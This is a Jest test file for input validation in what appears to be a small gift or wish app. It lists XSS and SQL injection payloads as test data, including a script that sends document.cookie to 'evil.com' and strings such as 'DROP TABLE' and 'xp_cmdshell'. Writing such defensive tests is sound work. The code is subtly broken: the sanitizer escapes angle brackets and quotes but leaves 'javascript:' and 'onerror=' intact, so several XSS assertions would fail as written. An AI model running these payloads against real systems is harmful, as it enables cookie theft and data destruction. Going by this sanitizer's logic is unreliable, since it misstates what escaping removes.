/**
 * Validation Edge Cases Tests
 *
 * Tests input validation including:
 * - Invalid inputs
 * - XSS attempts
 * - SQL injection attempts
 */

import { describe, it, expect, jest, beforeEach } from '@jest/globals';

// Types
interface ValidationResult {
  valid: boolean;
  sanitized?: string;
  errors: string[];
}

interface CouponInput {
  title: string;
  description: string;
}

interface WishInput {
  text: string;
}

interface PhotoInput {
  caption: string;
}

// Common XSS attack patterns
const XSS_PAYLOADS = [
  '<script>alert("xss")</script>',
  '"><script>alert(1)</script>',
  "javascript:alert('xss')",
  '<img src=x onerror=alert(1)>',
  '<svg onload=alert(1)>',
  '{{constructor.constructor("alert(1)")()}}',
  '<body onload=alert(1)>',
  '<iframe src="javascript:alert(1)">',
  '<input onfocus=alert(1) autofocus>',
  '<marquee onstart=alert(1)>',
  '<div style="background:url(javascript:alert(1))">',
  '"><img src=x onerror=alert(1)><"',
  "'-alert(1)-'",
  '<script>document.location="http://evil.com/"+document.cookie</script>',
];

// Common SQL injection patterns
const SQL_PAYLOADS = [
  "' OR '1'='1",
  "'; DROP TABLE users; --",
  "1'; SELECT * FROM users WHERE '1'='1",
  "admin'--",
  "' UNION SELECT * FROM users --",
  "1; DELETE FROM photos WHERE 1=1",
  "' OR 1=1 --",
  "'; INSERT INTO users VALUES ('hacker'); --",
  "1' AND '1'='1",
  "'; UPDATE users SET admin=1 WHERE username='hacker'; --",
  "' OR ''='",
  "1 OR 1=1",
  "'; EXEC xp_cmdshell('dir'); --",
  "' WAITFOR DELAY '0:0:5' --",
];

// Validation functions
const sanitizeHtml = (input: string): string => {
  return input
    .replace(/&/g, '&amp;')
    .replace(/</g, '&lt;')
    .replace(/>/g, '&gt;')
    .replace(/"/g, '&quot;')
    .replace(/'/g, '&#x27;')
    .replace(/\//g, '&#x2F;');
};

const validateTextInput = (input: string, maxLength: number = 1000): ValidationResult => {
  const errors: string[] = [];

  if (!input || input.trim().length === 0) {
    return { valid: false, errors: ['Input cannot be empty'] };
  }

  if (input.length > maxLength) {
    errors.push(`Input exceeds maximum length of ${maxLength}`);
  }

  // Check for null bytes
  if (input.includes('\0')) {
    errors.push('Input contains invalid characters');
  }

  const sanitized = sanitizeHtml(input.trim());

  return {
    valid: errors.length === 0,
    sanitized,
    errors,
  };
};

const validateCouponInput = (input: CouponInput): ValidationResult => {
  const errors: string[] = [];

  // Validate title
  if (!input.title || input.title.trim().length === 0) {
    errors.push('Title is required');
  } else if (input.title.length > 100) {
    errors.push('Title exceeds maximum length of 100');
  }

  // Validate description
  if (!input.description || input.description.trim().length === 0) {
    errors.push('Description is required');
  } else if (input.description.length > 500) {
    errors.push('Description exceeds maximum length of 500');
  }

  if (errors.length > 0) {
    return { valid: false, errors };
  }

  return {
    valid: true,
    sanitized: JSON.stringify({
      title: sanitizeHtml(input.title.trim()),
      description: sanitizeHtml(input.description.trim()),
    }),
    errors: [],
  };
};

const validateWishInput = (input: WishInput): ValidationResult => {
  const errors: string[] = [];

  if (!input.text || input.text.trim().length === 0) {
    errors.push('Wish text is required');
  } else if (input.text.length > 1000) {
    errors.push('Wish text exceeds maximum length of 1000');
  }

  if (errors.length > 0) {
    return { valid: false, errors };
  }

  return {
    valid: true,
    sanitized: sanitizeHtml(input.text.trim()),
    errors: [],
  };
};

const validateEmail = (email: string): ValidationResult => {
  const errors: string[] = [];
  const emailRegex = /^[^\s@]+@[^\s@]+\.[^\s@]+$/;

  if (!email || email.trim().length === 0) {
    errors.push('Email is required');
  } else if (!emailRegex.test(email)) {
    errors.push('Invalid email format');
  } else if (email.length > 254) {
    errors.push('Email exceeds maximum length');
  }

  return {
    valid: errors.length === 0,
    sanitized: email.toLowerCase().trim(),
    errors,
  };
};

const validateNumericInput = (input: string | number): ValidationResult => {
  const errors: string[] = [];
  const num = typeof input === 'string' ? parseFloat(input) : input;

  if (isNaN(num)) {
    errors.push('Input must be a valid number');
  } else if (!isFinite(num)) {
    errors.push('Input must be a finite number');
  } else if (num < 0) {
    errors.push('Input must be non-negative');
  }

  return {
    valid: errors.length === 0,
    sanitized: errors.length === 0 ? String(num) : undefined,
    errors,
  };
};

describe('Validation Edge Cases', () => {
  describe('Invalid Inputs', () => {
    it('should reject empty string input', () => {
      const result = validateTextInput('');
      expect(result.valid).toBe(false);
      expect(result.errors).toContain('Input cannot be empty');
    });

    it('should reject whitespace-only input', () => {
      const result = validateTextInput('   ');
      expect(result.valid).toBe(false);
      expect(result.errors).toContain('Input cannot be empty');
    });

    it('should reject input exceeding max length', () => {
      const longInput = 'a'.repeat(1001);
      const result = validateTextInput(longInput, 1000);
      expect(result.valid).toBe(false);
      expect(result.errors[0]).toContain('exceeds maximum length');
    });

    it('should reject input with null bytes', () => {
      const result = validateTextInput('test\0injection');
      expect(result.valid).toBe(false);
      expect(result.errors).toContain('Input contains invalid characters');
    });

    it('should accept valid input at max length', () => {
      const maxInput = 'a'.repeat(1000);
      const result = validateTextInput(maxInput, 1000);
      expect(result.valid).toBe(true);
    });

    it('should trim whitespace from valid input', () => {
      const result = validateTextInput('  valid input  ');
      expect(result.valid).toBe(true);
      expect(result.sanitized).not.toContain('  ');
    });

    describe('Coupon Validation', () => {
      it('should reject coupon with empty title', () => {
        const result = validateCouponInput({ title: '', description: 'Valid description' });
        expect(result.valid).toBe(false);
        expect(result.errors).toContain('Title is required');
      });

      it('should reject coupon with empty description', () => {
        const result = validateCouponInput({ title: 'Valid title', description: '' });
        expect(result.valid).toBe(false);
        expect(result.errors).toContain('Description is required');
      });

      it('should reject coupon with title too long', () => {
        const result = validateCouponInput({
          title: 'a'.repeat(101),
          description: 'Valid',
        });
        expect(result.valid).toBe(false);
        expect(result.errors[0]).toContain('Title exceeds');
      });

      it('should reject coupon with description too long', () => {
        const result = validateCouponInput({
          title: 'Valid',
          description: 'a'.repeat(501),
        });
        expect(result.valid).toBe(false);
        expect(result.errors[0]).toContain('Description exceeds');
      });

      it('should accept valid coupon input', () => {
        const result = validateCouponInput({
          title: 'Movie Night',
          description: 'Pick any movie',
        });
        expect(result.valid).toBe(true);
      });
    });

    describe('Email Validation', () => {
      it('should reject empty email', () => {
        const result = validateEmail('');
        expect(result.valid).toBe(false);
      });

      it('should reject email without @', () => {
        const result = validateEmail('invalidemail.com');
        expect(result.valid).toBe(false);
      });

      it('should reject email without domain', () => {
        const result = validateEmail('user@');
        expect(result.valid).toBe(false);
      });

      it('should reject email without TLD', () => {
        const result = validateEmail('user@domain');
        expect(result.valid).toBe(false);
      });

      it('should accept valid email', () => {
        const result = validateEmail('meedo@example.com');
        expect(result.valid).toBe(true);
      });

      it('should normalize email to lowercase', () => {
        const result = validateEmail('MEEDO@EXAMPLE.COM');
        expect(result.sanitized).toBe('meedo@example.com');
      });
    });

    describe('Numeric Validation', () => {
      it('should reject non-numeric string', () => {
        const result = validateNumericInput('not a number');
        expect(result.valid).toBe(false);
      });

      it('should reject NaN', () => {
        const result = validateNumericInput(NaN);
        expect(result.valid).toBe(false);
      });

      it('should reject Infinity', () => {
        const result = validateNumericInput(Infinity);
        expect(result.valid).toBe(false);
      });

      it('should reject negative numbers', () => {
        const result = validateNumericInput(-5);
        expect(result.valid).toBe(false);
      });

      it('should accept valid positive number', () => {
        const result = validateNumericInput(42);
        expect(result.valid).toBe(true);
      });

      it('should accept zero', () => {
        const result = validateNumericInput(0);
        expect(result.valid).toBe(true);
      });

      it('should accept numeric string', () => {
        const result = validateNumericInput('123');
        expect(result.valid).toBe(true);
        expect(result.sanitized).toBe('123');
      });
    });
  });

  describe('XSS Attempt Prevention', () => {
    it.each(XSS_PAYLOADS)('should sanitize XSS payload: %s', (payload) => {
      const result = validateTextInput(payload);

      // Should either reject or sanitize
      if (result.valid) {
        // If accepted, should be sanitized
        expect(result.sanitized).not.toContain('<script');
        expect(result.sanitized).not.toContain('onerror=');
        expect(result.sanitized).not.toContain('onload=');
        expect(result.sanitized).not.toContain('javascript:');
      }
    });

    it('should escape HTML entities in coupon title', () => {
      const result = validateCouponInput({
        title: '<script>alert("xss")</script>',
        description: 'Normal description',
      });

      if (result.valid && result.sanitized) {
        const parsed = JSON.parse(result.sanitized);
        expect(parsed.title).not.toContain('<script>');
        expect(parsed.title).toContain('&lt;script&gt;');
      }
    });

    it('should escape HTML entities in wish text', () => {
      const result = validateWishInput({
        text: '<img src=x onerror=alert(1)>',
      });

      if (result.valid) {
        expect(result.sanitized).not.toContain('<img');
        expect(result.sanitized).toContain('&lt;img');
      }
    });

    it('should handle nested XSS attempts', () => {
      const nested = '<<script>script>alert(1)<</script>/script>';
      const result = validateTextInput(nested);

      if (result.valid) {
        expect(result.sanitized).not.toContain('<script');
      }
    });

    it('should handle URL-encoded XSS', () => {
      const encoded = '%3Cscript%3Ealert(1)%3C/script%3E';
      const result = validateTextInput(encoded);

      // URL-encoded content should be safe as-is (decode happens elsewhere)
      expect(result.valid).toBe(true);
    });
  });

  describe('SQL Injection Attempt Prevention', () => {
    it.each(SQL_PAYLOADS)('should safely handle SQL payload: %s', (payload) => {
      // Note: Actual SQL injection prevention happens at the database layer
      // These tests verify that input validation doesn't crash and handles gracefully
      const result = validateTextInput(payload);

      // Input should be processed without throwing
      expect(result).toBeDefined();
      expect(typeof result.valid).toBe('boolean');
    });

    it('should escape quotes in user input', () => {
      const result = validateTextInput("O'Reilly");

      expect(result.valid).toBe(true);
      expect(result.sanitized).toContain('&#x27;'); // Escaped quote
    });

    it('should handle SQL comment syntax', () => {
      const result = validateTextInput('input -- comment');

      expect(result.valid).toBe(true);
      // Should be treated as normal text, not SQL comment
    });

    it('should handle semicolons safely', () => {
      const result = validateTextInput('statement; another');

      expect(result.valid).toBe(true);
    });

    it('should handle UNION keyword as normal text', () => {
      const result = validateWishInput({ text: 'I want a UNION jack flag' });

      expect(result.valid).toBe(true);
      // UNION as part of normal text is fine
    });
  });

  describe('Special Character Handling', () => {
    it('should handle emoji in input', () => {
      const result = validateTextInput('I love you <3');
      expect(result.valid).toBe(true);
    });

    it('should handle unicode characters', () => {
      const result = validateTextInput('Cafe au lait');
      expect(result.valid).toBe(true);
    });

    it('should handle newlines', () => {
      const result = validateTextInput('Line 1\nLine 2');
      expect(result.valid).toBe(true);
    });

    it('should handle tabs', () => {
      const result = validateTextInput('Column1\tColumn2');
      expect(result.valid).toBe(true);
    });

    it('should handle backslashes', () => {
      const result = validateTextInput('path\\to\\file');
      expect(result.valid).toBe(true);
    });

    it('should handle mixed quotes', () => {
      const result = validateTextInput('He said "it\'s fine"');
      expect(result.valid).toBe(true);
      expect(result.sanitized).toContain('&quot;');
      expect(result.sanitized).toContain('&#x27;');
    });
  });
});
